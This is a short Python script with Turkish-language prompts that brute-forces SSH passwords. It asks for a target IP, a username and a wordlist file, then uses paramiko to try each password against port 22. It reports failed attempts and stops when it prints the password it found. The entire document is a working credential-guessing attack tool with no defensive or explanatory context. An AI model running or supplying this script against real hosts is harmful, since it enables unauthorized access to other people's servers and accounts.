import paramiko
import time

target = input("Hedef IP: ")
username = input("Kullanıcı Adı: ")
wordlist = input("Şifre Listesi Dosyası: ")

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=22, username=username, password=password)
        return True
    except:
        return False
    finally:
        ssh.close()

with open(wordlist, 'r') as file:
    for line in file:
        password = line.strip()
        try:
            if ssh_connect(password):
                print(f"[+] ŞİFRE BULUNDU: {password}")
                break
            else:
                print(f"[-] Hatalı: {password}")
        except Exception as e:
            print(e)
        time.sleep(0.5)